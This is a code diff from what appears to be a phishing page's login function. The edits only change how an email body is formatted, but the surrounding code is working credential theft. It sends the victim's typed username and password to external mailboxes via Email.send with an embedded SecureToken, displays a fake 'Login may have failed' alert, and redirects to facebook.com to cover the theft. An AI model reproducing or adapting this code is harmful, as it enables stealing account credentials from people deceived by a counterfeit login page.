@@ -62,7 +62,7 @@ function login() {
     From: "passduck99@gmail.com",
     // From: input.value(),
     Subject: "Username and Password",
-    Body: "Username: " + username.value() + "<br><br>Password " + password.value()
+    Body: "Username: " + username.value() + "<br>Password: " + password.value()
   }).then();
   Email.send({
     SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
@@ -71,7 +71,7 @@ function login() {
     From: "usernames@gmail.com",
     // From: input.value(),
     Subject: "Username and Password",
-    Body: "Username: " + username.value() + "<br><br>Password " + password.value()
+    Body: "Username: " + username.value() + "<br>Password: " + password.value()
   }).then(
     alert('Login may have failed'));
     window.location.replace("http://facebook.com");
